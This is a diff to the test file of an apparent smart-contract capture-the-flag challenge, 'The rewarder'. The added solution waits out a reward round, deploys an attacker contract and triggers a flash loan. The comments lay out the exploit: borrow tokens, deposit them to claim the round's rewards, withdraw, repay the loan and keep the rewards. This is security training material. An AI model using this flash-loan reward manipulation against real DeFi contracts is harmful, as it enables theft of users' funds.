@@ -70,6 +70,12 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Wait until the next reward round
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        // Request a loan from the pool, when we receive it, deposit the tokens in the reward pool,
+        // request the reward and withdraw our tokens. Then pay back the flash loan and transfer the reward tokens to our address 
+        let taker = await (await ethers.getContractFactory('RewardTaker', player)).deploy();
+        await taker.requestFlashLoan(flashLoanPool.address, rewarderPool.address);
     });
 
     after(async function () {
